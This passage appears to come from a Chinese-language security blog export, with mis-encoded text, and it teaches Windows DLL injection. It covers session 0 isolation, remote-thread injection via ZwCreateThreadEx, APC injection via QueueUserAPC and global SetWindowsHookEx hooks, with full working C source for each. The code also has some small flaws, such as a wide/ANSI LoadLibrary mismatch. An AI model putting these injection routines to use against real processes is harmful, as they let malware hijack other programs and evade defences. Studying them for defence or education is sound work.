<h4 id="session-0-éš”ç¦»æœºåˆ¶"><a href="#session-0-éš”ç¦»æœºåˆ¶" class="headerlink" title="session 0 éš”ç¦»æœºåˆ¶"></a>session 0 éš”ç¦»æœºåˆ¶</h4><p><a href="https://blog.csdn.net/suppercoder/article/details/17167537">https://blog.csdn.net/suppercoder/article/details/17167537</a></p>
<p><a href="https://www.cnblogs.com/gnielee/archive/2010/04/07/session0-isolation-part1.html">https://www.cnblogs.com/gnielee/archive/2010/04/07/session0-isolation-part1.html</a></p>
<p>session0ä¼šè¯: åœ¨Windows XPã€Windows Server 2003ï¼Œä»¥åŠæ›´è€ç‰ˆæœ¬çš„Windowsæ“ä½œç³»ç»Ÿä¸­ï¼ŒæœåŠ¡å’Œåº”ç”¨ç¨‹åºä½¿ç”¨ç›¸åŒçš„ä¼šè¯ï¼ˆSessionï¼‰è¿è¡Œï¼Œè€Œè¿™ä¸ªä¼šè¯æ˜¯ç”±ç¬¬ä¸€ä¸ªç™»å½•åˆ°æ§åˆ¶å°çš„ç”¨æˆ·å¯åŠ¨çš„ï¼Œè¿™ä¸ªä¼šè¯å³ Session0ã€‚</p>
<p>ä»Windows VISTAå¼€å§‹ï¼Œåªæœ‰æœåŠ¡å¯ä»¥æ‰˜ç®¡åˆ°SESSION0ä¸­ï¼Œç”¨æˆ·åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¹‹é—´ä¼šè¿›è¡Œéš”ç¦»ï¼Œå¹¶éœ€è¦è¿è¡Œåœ¨ç”¨æˆ·ç™»å½•ç³»ç»Ÿæ—¶åˆ›å»ºçš„åç»­ä¼šè¯ä¸­ã€‚</p>
<p>å¦‚ç¬¬ä¸€ä¸ªç™»å½•ç”¨æˆ·åˆ›å»ºSession1ï¼Œç¬¬äºŒä¸ªç™»å½•ç”¨æˆ·åˆ›å»ºSession2ï¼Œä»¥æ­¤ç±»æ¨ã€‚ä½¿ç”¨ä¸åŒä¼šè¯è¿è¡Œçš„å®ä½“ï¼ˆåº”ç”¨ç¨‹åºæˆ–æœåŠ¡ï¼‰å¦‚æœä¸å°†è‡ªå·±æ˜ç¡®æ ‡æ³¨ä¸ºå…¨å±€å‘½åç©ºé—´ï¼Œå¹¶æä¾›ç›¸åº”çš„è®¿é—®æ§åˆ¶è®¾ç½®ï¼Œé‚£ä¹ˆå°†æ— æ³•äº’ç›¸å‘é€æ¶ˆæ¯ï¼Œå…±äº«UIå…ƒç´ æˆ–å…±äº«å†…æ ¸å¯¹è±¡ã€‚</p>
<p><img src="/posts/215f7b36/1.png" alt="img"></p>
<h4 id="ZwCreateThreadExå‡½æ•°"><a href="#ZwCreateThreadExå‡½æ•°" class="headerlink" title="ZwCreateThreadExå‡½æ•°"></a>ZwCreateThreadExå‡½æ•°</h4><p>åœ¨Windowsä¸‹NtCreateThreadExæ˜¯CreateRemoteThreadçš„åº•å±‚å‡½æ•°,ä½†æ˜¯NtCreateThreadEx å¹¶æœªåœ¨ntdll.dllä¸­å£°æ˜ éœ€è¦æ‰‹åŠ¨ä½¿ç”¨GetProcAddresså‡½æ•°å°†å…¶åœ°å€å¯¼å‡ºã€‚</p>
<p>åœ¨32ä½ä¸‹å’Œ64ä½ä¸‹ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">//32</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h4 id="æ³¨å…¥æ–¹æ³•"><a href="#æ³¨å…¥æ–¹æ³•" class="headerlink" title="æ³¨å…¥æ–¹æ³•"></a>æ³¨å…¥æ–¹æ³•</h4><ul>
<li>1.OpenProcess æ‰“å¼€è¦æ³¨å…¥çš„è¿›ç¨‹</li>
<li>2.VirtualAllocEx åœ¨è¢«æ³¨å…¥çš„è¿›ç¨‹ä¸­ç”³è¯·å†™å†…å­˜</li>
<li>3.WriteProcessMemory å†™å…¥dllè·¯å¾„åˆ°ç”³è¯·çš„å†…å­˜ä¸­</li>
<li>4.LoadlibraryAã€GetProcAddress  åŠ è½½ntdll.dllä»¥è·å–å†…æ ¸å‡½æ•°ZwCreateThreadExåœ°å€</li>
<li>5.ZwCreateThreadEx åˆ›å»ºè¿œçº¿ç¨‹å®ç°dllæ³¨å…¥</li>
<li>6.é‡Šæ”¾ç”³è¯·å†…å­˜çš„å¥æŸ„</li>
</ul>
<h4 id="å®ç°ä»£ç "><a href="#å®ç°ä»£ç " class="headerlink" title="å®ç°ä»£ç "></a>å®ç°ä»£ç </h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span>	<span class="comment">//32</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* MyZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">	DWORD dwStackSize,</span></span><br><span class="line"><span class="params">	DWORD dw1,</span></span><br><span class="line"><span class="params">	DWORD dw2,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ZwCreateThreadExInjectDll</span><span class="params">(<span class="type">int</span> pid, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(dllname) + <span class="number">1</span>;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shen</span></span><br><span class="line">	PVOID dllNameAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == dllNameAddr) &#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(hProcess, dllNameAddr, dllname, len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	HMODULE ntdll = LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	FARPROC funAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	MyZwCreateThreadEx  ZwCreateThreadEx = (MyZwCreateThreadEx)GetProcAddress(ntdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);  <span class="comment">//å¼ºè½¬ä¸€ä¸‹ç±»å‹</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//ä½¿ç”¨ZwCreateThreadExåˆ›å»ºè¿œç¨‹çº¿ç¨‹</span></span><br><span class="line">	HANDLE remoteThread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ZwCreateThreadEx(&amp;remoteThread,PROCESS_ALL_ACCESS,<span class="literal">NULL</span>,hProcess,funAddr,dllNameAddr,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (remoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	FreeLibrary(ntdll);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ZwCreateThreadExInjectDll(10288,&quot;C:\\Users\\test\\source\\repos\\ç”¨æˆ·å±‚æ³¨å…¥\\Debug\\hookdll.dll&quot;);</span></span><br><span class="line"></span><br><span class="line">	ZwCreateThreadExInjectDll(<span class="number">5584</span>,<span class="string">&quot;C:\\Users\\test\\source\\repos\\ç”¨æˆ·å±‚æ³¨å…¥\\x64\\Debug\\hookdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/215f7b36/2.png" alt="img"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/iBinary/p/16026217.html">https://www.cnblogs.com/iBinary/p/16026217.html</a></p>
<p><a href="https://www.cnblogs.com/PeterZ1997/p/10596100.html">https://www.cnblogs.com/PeterZ1997/p/10596100.html</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/15318327.html">https://www.cnblogs.com/nice0e3/p/15318327.html</a></p>
]]></content>
      <categories>
        <category>ç”¨æˆ·æ€æ³¨å…¥</category>
      </categories>
      <tags>
        <tag>ç”¨æˆ·æ€æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>APCæ³¨å…¥</title>
    <url>/posts/5fe10d5b/</url>
    <content><![CDATA[<h4 id="APCç®€ä»‹"><a href="#APCç®€ä»‹" class="headerlink" title="APCç®€ä»‹"></a>APCç®€ä»‹</h4><p>APC(Asynchronous Procedure Calls,å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨)</p>
<ul>
<li><p> <strong>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„APCé˜Ÿåˆ—</strong>ï¼Œå¯ä»¥ä½¿ç”¨<code>**QueueUserAPC**</code>æŠŠä¸€ä¸ªAPCæ’å…¥åˆ°çº¿ç¨‹APCé˜Ÿåˆ—ä¸­ã€‚å½“çº¿ç¨‹å¤„äºå¯è­¦é†’çŠ¶æ€æ—¶ï¼Œçº¿ç¨‹ä¼šæ‰§è¡ŒAPCé˜Ÿåˆ—ä¸­çš„APCå‡½æ•°ã€‚</p>
</li>
<li><p>çº¿ç¨‹åˆ›å»ºå ç³»ç»Ÿä¼šåœ¨è°ƒç”¨çº¿ç¨‹å‡½æ•°æ—¶æ£€æŸ¥APCé˜Ÿåˆ—ï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨APCé˜Ÿåˆ—ä¸­çš„APCå‡½æ•°ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºåæ‰ä¼šè°ƒç”¨çº¿ç¨‹å‡½æ•°ã€‚ï¼ˆçº¿ç¨‹é€šè¿‡è°ƒç”¨<code>**SleepExã€SignalObjectAdndWaitã€WaitForSingleObjectExã€WaitForMultioleObjectsEx**</code>ç­‰å‡½æ•°æŒ‚èµ·æ—¶ï¼ˆå³è¿›å…¥[<code>alertable</code>]å¯æƒŠé†’çŠ¶æ€æ—¶)ï¼Œ ä¼šå…ˆæ£€æŸ¥APCé˜Ÿåˆ—ï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨APCé˜Ÿåˆ—ä¸­çš„APCå‡½æ•°ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºåæ‰ä¼šå¼€å§‹ç­‰å¾…è¦ç­‰å¾…çš„å¯¹è±¡ã€‚ï¼‰  æ‰§è¡Œé¡ºåºä»¥æ™®é€šé˜Ÿåˆ—ç›¸åŒ <strong>å…ˆè¿›å…ˆå‡º(FIFO)<strong>ã€‚åœ¨æ•´æ”¹æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œçº¿ç¨‹å¹¶ä¸ä¼šæœ‰ä»»ä½•å¼‚å¸¸ä¸¾åŠ¨ï¼Œä¸æ˜“è¢«å·®è·ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯å¯¹äº</strong>å•çº¿ç¨‹ç¨‹åºä¸€èˆ¬ä¸ä¼šå­˜åœ¨æŒ‚èµ·çŠ¶æ€</strong>ï¼Œæ‰€ä»¥APCæ³¨å…¥ä¸ä¼šå¯¹è¯¥ç±»ç¨‹åºæœ‰æ˜æ˜¾æ•ˆæœã€‚</p>
</li>
<li><p>ç”±å†…æ ¸äº§ç”Ÿçš„APCç§°ä¸ºå†…æ ¸æ€(kernel-mode)APCï¼Œç”¨æˆ·åº”ç”¨è°ƒç”¨çš„APCç§°ä¸ºç”¨æˆ·æ€(user-mode)APCã€‚</p>
</li>
</ul>
<h4 id="APCæ³¨å…¥"><a href="#APCæ³¨å…¥" class="headerlink" title="APCæ³¨å…¥"></a>APCæ³¨å…¥</h4><h5 id="QueueUserAPCå‡½æ•°"><a href="#QueueUserAPCå‡½æ•°" class="headerlink" title="QueueUserAPCå‡½æ•°"></a>QueueUserAPCå‡½æ•°</h5><p>å°†ç”¨æˆ·æ¨¡å¼å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨ï¼ˆAPCï¼‰å¯¹è±¡æ·»åŠ åˆ°æŒ‡å®šçº¿ç¨‹çš„APCé˜Ÿåˆ—</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">QueueUserAPC</span><span class="params">(</span></span><br><span class="line"><span class="params">  PAPCFUNC  pfnAPC,</span></span><br><span class="line"><span class="params">  HANDLE    hThread,</span></span><br><span class="line"><span class="params">  ULONG_PTR dwData</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="APCæ³¨å…¥å…·ä½“æµç¨‹"><a href="#APCæ³¨å…¥å…·ä½“æµç¨‹" class="headerlink" title="APCæ³¨å…¥å…·ä½“æµç¨‹"></a>APCæ³¨å…¥å…·ä½“æµç¨‹</h5><ul>
<li>é€šè¿‡OpenProcesså‡½æ•°æ‰“å¼€ç›®æ ‡è¿›ç¨‹ï¼Œè·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„.</li>
<li>ä½¿ç”¨VirtualAllocExåœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€å—å†…å­˜ï¼Œç„¶åé€šè¿‡WriteProcessMemoryå‡½æ•°å‘å†…å­˜ä¸­å†™å…¥dllè·¯å¾„.</li>
<li>è°ƒç”¨WIN32APIå‡½æ•°CreateToolhelp32Snapshotã€Thread32Firstã€Thread32Nextéå†çº¿ç¨‹å¿«ç…§ï¼Œè·å–ç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹ID.</li>
<li>éå†è¿›ç¨‹IDï¼Œè°ƒç”¨OpenThreadå‡½æ•°åŠTHREAD_ALL_ACCESSè®¿é—®æƒé™æ‰“å¼€çº¿ç¨‹ï¼Œè·å–çº¿ç¨‹å¥æŸ„ã€‚å¹¶è°ƒç”¨QueueThreadå‡½æ•°å‘çº¿ç¨‹æ’å…¥APCå‡½æ•°ï¼Œè®¾ç½®APCå‡½æ•°çš„åœ°å€ä¸ºLoadlibraryå‡½æ•°çš„åœ°å€ï¼Œå¹¶è®¾ç½®APCå‡½æ•°å‚æ•°ä¸ºä¸Šè¿°DLLè·¯å¾„åœ°å€.</li>
<li>æœ€åå…³é—­å¥æŸ„.</li>
</ul>
<h5 id="å®ç°ä»£ç "><a href="#å®ç°ä»£ç " class="headerlink" title="å®ç°ä»£ç "></a>å®ç°ä»£ç </h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ApcInjectDll</span><span class="params">(DWORD pid, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="comment">//è®¡ç®—DLLæ–‡ä»¶åé•¿åº¦</span></span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(dllname) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//æ‰“å¼€ç›®æ ‡è¿›ç¨‹</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·ä¸€å—é•¿åº¦ä¸ºlenå¤§å°çš„å†…å­˜ç©ºé—´</span></span><br><span class="line">	PVOID dllNameAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (dllNameAddr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//æŠŠDLLæ–‡ä»¶å®Œæ•´è·¯å¾„å†™åˆ°åˆ†é…çš„å†…å­˜é‡Œé¢</span></span><br><span class="line">	WriteProcessMemory(hProcess, dllNameAddr, dllname, len, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	THREADENTRY32 te = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	te.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å¾—åˆ°çº¿ç¨‹å¿«ç…§</span></span><br><span class="line">	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (handle == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//è·å–loadlibraryåœ°å€</span></span><br><span class="line">	FARPROC funAddr = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Thread32First(handle, &amp;te);</span><br><span class="line">	<span class="keyword">while</span> (Thread32Next(handle, &amp;te))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (te.th32OwnerProcessID == pid)</span><br><span class="line">		&#123;</span><br><span class="line">			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);</span><br><span class="line">			<span class="keyword">if</span> (hThread)</span><br><span class="line">			&#123;</span><br><span class="line">				QueueUserAPC((PAPCFUNC)funAddr, hThread, dllNameAddr);</span><br><span class="line">				CloseHandle(hThread);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥pid&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> pid = atol(argv[<span class="number">1</span>]);</span><br><span class="line">	ApcInjectDll(pid, <span class="string">&quot;C:\\Users\\test\\Desktop\\hookdll.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨notepadä¸­ ä½¿ç”¨64ä½æ³¨å…¥æˆåŠŸ</p>
<p><img src="/posts/5fe10d5b/1.png" alt="img"></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/nice0e3/p/15318330.html">https://www.cnblogs.com/nice0e3/p/15318330.html</a></p>
<p><a href="https://www.cnblogs.com/iBinary/p/7574055.html">https://www.cnblogs.com/iBinary/p/7574055.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/145644574">https://zhuanlan.zhihu.com/p/145644574</a></p>
<p><a href="https://www.cnblogs.com/PeterZ1997/p/10584557.html">https://www.cnblogs.com/PeterZ1997/p/10584557.html</a></p>
]]></content>
      <categories>
        <category>ç”¨æˆ·æ€æ³¨å…¥</category>
      </categories>
      <tags>
        <tag>ç”¨æˆ·æ€æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>å…¨å±€é’©å­æ³¨å…¥</title>
    <url>/posts/69a3489c/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C C++æ··ç”¨ å£°æ˜</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _declspec(dllexport) <span class="type">void</span> <span class="title function_">OnHook</span><span class="params">()</span>;</span><br><span class="line">    _declspec(dllexport) <span class="type">void</span> <span class="title function_">OffHook</span><span class="params">()</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">HHOOK g_hook = <span class="literal">NULL</span>;  <span class="comment">//å®šä¹‰ä¸€ä¸ªå…¨å±€é’©å­éå†</span></span><br><span class="line">HINSTANCE instance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        instance = hModule;</span><br><span class="line">        MessageBoxA(<span class="number">0</span>,<span class="string">&quot;text&quot;</span>, <span class="string">&quot;title&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">getMsgProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparam, LPARAM lparam)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hook, code, wparam, lparam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">OnHook</span><span class="params">()</span> &#123;</span><br><span class="line">    g_hook = SetWindowsHookEx(WH_GETMESSAGE, getMsgProc, instance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">OffHook</span><span class="params">()</span> &#123;</span><br><span class="line">    UnhookWindowsHookEx(g_hook);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*hookOn)</span><span class="params">()</span>;   <span class="comment">//å®šä¹‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*hookOff)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	HMODULE hmod = LoadLibraryA(<span class="string">&quot;hookdll.dll&quot;</span>);</span><br><span class="line">	hookOn hook_on = (hookOn)GetProcAddress(hmod, <span class="string">&quot;OnHook&quot;</span>);</span><br><span class="line">	hookOff hook_off = (hookOff)GetProcAddress(hmod, <span class="string">&quot;OffHook&quot;</span>);</span><br><span class="line"></span><br><span class="line">	hook_on();</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	hook_off();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç”¨æˆ·æ€æ³¨å…¥</category>
      </categories>
      <tags>
        <tag>ç”¨æˆ·æ€æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>C-13_åŠ¨æ€è·å–APIå‡½æ•°åœ°å€</title>
    <url>/posts/9aa42a48/</url>
